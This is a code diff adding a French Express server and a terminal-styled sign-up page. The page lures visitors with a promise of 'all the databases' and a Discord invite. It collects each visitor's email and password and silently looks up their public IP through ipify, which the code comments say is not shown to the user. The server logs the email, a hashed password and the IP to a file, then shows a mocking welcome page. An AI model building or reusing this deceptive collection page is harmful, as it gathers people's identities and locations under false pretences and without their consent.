@@ -1,0 +1,386 @@
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const bcrypt = require('bcrypt');
+const rateLimit = require('express-rate-limit');
+const app = express();
+const PORT = 3000;
+
+// Middlewares
+app.use(express.static('public'));
+app.use(express.json());
+
+// Dossier des logs
+const logDir = path.join(__dirname, 'logs');
+if (!fs.existsSync(logDir)) {
+    fs.mkdirSync(logDir);
+}
+
+// Middleware de limitation de requêtes
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 50, // max 50 requêtes par IP
+    message: 'Trop de tentatives. Réessayez plus tard.'
+});
+app.use(limiter);
+
+// Fonction pour "nettoyer" les entrées utilisateur
+const sanitize = str => {
+    return String(str).replace(/[<>"']/g, '').trim();
+};
+
+// Route POST : enregistrement sécurisé
+app.post('/save-login', async (req, res) => {
+    try {
+        let { email, password, ip } = req.body;
+
+        // Sanitize les données
+        email = sanitize(email);
+        password = sanitize(password);
+        ip = sanitize(ip);
+
+        // Valider qu'on a tout
+        if (!email || !password || !ip) {
+            return res.status(400).json({ message: 'Champs manquants' });
+        }
+
+        // Hasher le mot de passe
+        const hashedPassword = await bcrypt.hash(password, 10);
+
+        // Format du log
+        const log = `Email: ${email} | Password: ${hashedPassword} | IP: ${ip} | Date: ${new Date().toISOString()}\n`;
+
+        // Sauvegarde dans le fichier
+        fs.appendFile(path.join(logDir, 'logins.txt'), log, err => {
+            if (err) {
+                console.error('Erreur lors de l\'enregistrement', err);
+                return res.status(500).json({ message: 'Erreur serveur' });
+            }
+
+            // Répond avec un message et redirection
+            res.json({ message: '✅ Enregistrement réussi !', redirectTo: '/welcome' });
+        });
+
+    } catch (err) {
+        console.error('Erreur interne', err);
+        res.status(500).json({ message: 'Erreur interne' });
+    }
+});
+
+// Page de bienvenue
+app.get('/welcome', (req, res) => {
+    res.send(`
+        <html>
+          <head>
+            <title>Bienvenue</title>
+            <style>
+              body {
+                background-color: #000;
+                color: #0f0;
+                font-family: monospace;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+              }
+              h1 {
+                font-size: 3em;
+                animation: blink 1s infinite alternate;
+              }
+              @keyframes blink {
+                from { opacity: 1; }
+                to { opacity: 0.5; }
+              }
+            </style>
+          </head>
+          <body>
+            <h1>👋 Coucou RSM on top !</h1>
+          </body>
+        </html>
+    `);
+});
+
+app.listen(PORT, () => {
+    console.log(`✅ Serveur démarré sur http://localhost:${PORT}`);
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+HTML
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>S'enregistrer</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      background-color: #000000;
+      color: #00ff00; /* Couleur typique des écrans de terminal */
+      display: flex;
+      justify-content: center;  /* Centrer horizontalement */
+      align-items: center;      /* Centrer verticalement */
+      height: 100vh;            /* Prendre toute la hauteur de l'écran */
+      margin: 0;
+      flex-direction: column;
+    }
+
+    /* Titre statique */
+    .header-message {
+      font-size: 1.8em;
+      text-align: center;
+      margin-bottom: 20px;
+      color: #00ff00;
+      font-weight: bold;
+      letter-spacing: 2px;
+    }
+
+    /* Formulaire de connexion avec un style terminal */
+    form {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
+      width: 100%;
+      max-width: 400px;  /* Limiter la largeur du formulaire */
+      border: 2px solid #00ff00;
+      color: #00ff00;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 1.8em;
+    }
+
+    input {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin: 12px 0;
+      border-radius: 8px;
+      border: 1px solid #00ff00;
+      font-size: 1.2em;
+      background-color: transparent;
+      color: #00ff00;
+      transition: border-color 0.3s ease;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #ff6600;
+    }
+
+    button {
+      padding: 15px;
+      width: 100%;
+      background-color: #00ff00;
+      color: black;
+      border: none;
+      cursor: pointer;
+      border-radius: 8px;
+      font-size: 1.1em;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #ff6600;
+    }
+
+    /* Bloc promo avec un style hack */
+    .promo {
+      border: 2px solid #00ff00;
+      background-color: rgba(0, 0, 0, 0.8);
+      padding: 20px;
+      margin-top: 30px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      font-size: 1.2em;
+      font-weight: bold;
+      color: #00ff00;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+    }
+
+    .promo a {
+      color: #ffffff; /* Changer la couleur en blanc */
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s ease;
+      text-decoration: underline; /* Souligner le lien */
+    }
+
+    .promo a:hover {
+      color: #ff6600; /* Changer la couleur au survol */
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 0.9em;
+      text-align: center;
+      color: #888;
+    }
+
+    .footer a {
+      color: #00ff00;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      color: #ff6600;
+    }
+
+    /* Style pour le message de succès */
+    .success-message {
+      background-color: #4CAF50; /* Vert de succès */
+      color: white;
+      font-size: 1.5em;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      margin-top: 20px;
+      width: 80%;
+      max-width: 400px;
+      margin: 20px auto;
+      opacity: 0;
+      transform: translateY(-20px);
+      animation: slideIn 1s forwards;
+    }
+
+    @keyframes slideIn {
+      0% {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+  </style>
+</head>
+<body>
+  <!-- Titre statique -->
+  <div class="header-message">
+    Pour récupérer toutes les bases de données, enregistrez-vous ci-dessous !
+  </div>
+
+  <!-- Formulaire d'enregistrement -->
+  <div>
+    <form onsubmit="handleLogin(event)">
+      <h2>S'enregistrer</h2>
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Mot de passe" required />
+      <button type="submit">S'enregistrer</button>
+    </form>
+  </div>
+
+  <!-- Bloc promo Discord -->
+  <div class="promo">
+    <p>Rejoignez notre communauté et accédez à toutes les bases de données en un clic :</p>
+    <a href="https://discord.gg/JvGeYkqfas" target="_blank">Cliquez ici pour rejoindre notre serveur Discord</a>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>Déjà un compte ? <a href="#">Se connecter</a></p>
+  </div>
+
+  <!-- Message de succès -->
+  <div id="success-message" class="success-message" style="display: none;">
+    Enregistré avec succès !
+  </div>
+
+  <script>
+    let userIP = "";
+
+    // Récupérer l'IP publique via ipify (sans l'afficher)
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.ip; // On garde l'IP dans la variable userIP
+      })
+      .catch(() => {
+        console.error("Impossible de récupérer l'IP.");
+      });
+
+    function handleLogin(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("password").value;
+
+      // Envoi des informations avec l'IP récupérée au backend
+      fetch("/save-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password: pass, ip: userIP })
+      })
+      .then(res => res.json())  // Attente de la réponse sous forme d'objet JSON
+      .then(data => {
+        // Afficher le message de succès avec animation
+        const successMessage = document.getElementById("success-message");
+        successMessage.style.display = "block";  // Afficher le message
+        successMessage.textContent = data.message;  // Afficher le texte du message
+        
+        // Redirection après 2 secondes
+        if (data.redirectTo) {
+          setTimeout(() => {
+            window.location.href = data.redirectTo;  // Redirige vers la page de bienvenue
+          }, 2000); // Redirection après 2 secondes
+        }
+        
+        // Reset form
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+      })
+      .catch(err => {
+        alert("Erreur lors de l'envoi des données.");
+        console.error(err);
+      });
+    }
+  </script>
+</body>
+</html>
